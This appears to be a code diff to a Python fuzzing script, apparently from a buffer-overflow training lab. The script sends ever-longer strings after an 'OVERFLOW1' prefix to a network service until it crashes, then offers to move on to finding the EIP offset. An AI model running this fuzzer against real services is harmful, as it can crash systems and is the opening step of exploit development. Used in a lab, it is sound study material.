@@ -13,6 +13,7 @@ def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 	prefix = b"OVERFLOW1 "														# CHANGE IF NECESSARY
 	buffer = b"A"
 	timeout = 5
+	payload = b""
 	try:
 		# Create socket object
 		with socket.socket() as s:
@@ -22,33 +23,36 @@ def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 			# Set Timeout
 			s.settimeout(timeout)
 
+			# Print server banner
+			response = s.recv(4096)
+			print(f"Banner: {response.decode()}")
+
 			# Send data to the server with increasing buffer sizes
 			step = increment or 100
 			for size in itertools.count(step, step):
-				buffer = buffer * size
 				payload = b"".join(
 					[
 						prefix,
-						buffer
+						buffer * size
 					]
 				)
-				print(f"Fuzzing with {len(buffer)} bytes...")
+				print(f"Fuzzing with {len(payload) - len(prefix)} bytes...")
 				s.send(payload)
 
-				response = s.recv(1024)
-				# Print the response from the server and sleep for 1 second
+				response = s.recv(4096)
+				# Print the response from the server
 				print(f"Response: {response.decode()}")
-				time.sleep(1)
 
 		
-	except:
+	except Exception as e:
+		print(e)
 		print("\n","="*25,"CRASH","="*25,"\n")
-		overflow_threshold = len(buffer)
-		print(f"Fuzzing process crashed at {overflow_threshold} bytes")
+		overflow_threshold = len(payload) - len(prefix)
+		print(f"Application crashed at {overflow_threshold} bytes!")
 		while True:
-			answer = input("Do you want to continue? (y/n): ")
+			answer = input("Do you want to continue and find the EIP offset? (y/n): ")
 			if answer.lower() == "y":
-				print("Starting the Control EIP Script with:")
+				print("Starting to find EIP script with:")
 				print(f"\tIP: {ip}")
 				print(f"\tPort: {port}")
 				print(f"\tOverflow Threshold: {overflow_threshold}")
